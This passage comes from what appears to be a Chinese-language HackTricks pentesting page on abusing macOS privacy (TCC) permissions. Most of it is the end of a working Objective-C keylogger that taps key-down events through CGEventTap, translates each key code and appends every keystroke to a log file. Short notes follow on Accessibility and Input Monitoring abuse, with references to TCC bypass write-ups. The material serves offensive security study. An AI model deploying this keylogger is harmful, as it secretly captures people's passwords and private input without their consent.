case kVK_Tab: keyString = @"<Tab>"; break;
case kVK_Space: keyString = @"<Space>"; break;
case kVK_Delete: keyString = @"<Delete>"; break;
case kVK_Escape: keyString = @"<Escape>"; break;
case kVK_Command: keyString = @"<Command>"; break;
case kVK_Shift: keyString = @"<Shift>"; break;
case kVK_CapsLock: keyString = @"<CapsLock>"; break;
case kVK_Option: keyString = @"<Option>"; break;
case kVK_Control: keyString = @"<Control>"; break;
case kVK_RightControl: keyString = @"<Control>"; break;
case kVK_RightShift: keyString = @"<Shift>"; break;
case kVK_RightOption: keyString = @"<Option>"; break;
case kVK_Function: keyString = @"<Function>"; break;
case kVK_F1: keyString = @"<F1>"; break;
case kVK_F2: keyString = @"<F2>"; break;
case kVK_F3: keyString = @"<F3>"; break;
// Add more cases here for other non-printable keys...
default: break; // Not a special non-printable key
}

// If it's not a special key, try to translate it
if (!keyString) {
UniCharCount maxStringLength = 4;
UniCharCount actualStringLength = 0;
UniChar unicodeString[maxStringLength];

TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

UInt32 deadKeyState = 0;
OSStatus status = UCKeyTranslate(keyboardLayout,
keyCode,
kUCKeyActionDown,
0,
LMGetKbdType(),
kUCKeyTranslateNoDeadKeysBit,
&deadKeyState,
maxStringLength,
&actualStringLength,
unicodeString);
CFRelease(currentKeyboard);

if (status == noErr && actualStringLength > 0) {
keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
} else {
keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
}
}

NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
AppendStringToFile(logString, kKeystrokesLogPath);
}
return event;
}

int main() {
@autoreleasepool {
CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);

if (!eventTap) {
NSLog(@"Failed to create event tap");
exit(1);
}

CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
CGEventTapEnable(eventTap, true);
CFRunLoopRun();
}
return 0;
}
```
{{#endtab}}
{{#endtabs}}

> [!CAUTION] > **Accessibility 是一种非常强大的权限**，你可以通过其他方式滥用它，例如仅利用它就能执行 **keystrokes attack**，而无需调用 System Events。

> [!TIP]
> 较新的 macOS 版本还将桌面会话滥用拆分到 **Input Monitoring** (`kTCCServiceListenEvent`) 和 **synthetic input** (`kTCCServicePostEvent)` 中。如果你需要进行 keylogging、screen grabs 或 raw event injection，而不是使用 AXUIElement automation，请查看 [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md)。

## References

- [1] [Cisco Talos - macOS 上 Microsoft 应用中的多个漏洞如何为窃取权限铺平道路](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
- [2] [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
- [3] [Apple Developer - 在 macOS 上请求 Media Capture 授权](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
- [4] [Apple Developer - 使用 ScreenCaptureKit Capture HDR content（WWDC24）](https://developer.apple.com/videos/play/wwdc2024/10088/)
- [5] [vsociety - CVE-2023-26818：使用 DyLib Injection 绕过 MacOS TCC，Part1](https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4)
- [6] [Vicarius vsociety - CVE-2023-26818：使用 Telegram Exploit macOS TCC Bypass（Part 1）](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
- [7] [Apple Developer - 使用 Core Audio taps Capturing system audio](https://developer.apple.com/documentation/coreaudio/capturing-system-audio-with-core-audio-taps)
- [8] [catap - Core Audio process taps 的 Python bindings 和 recorder](https://github.com/sbetko/catap)
{{#include ../../../../banners/hacktricks-training.md}}
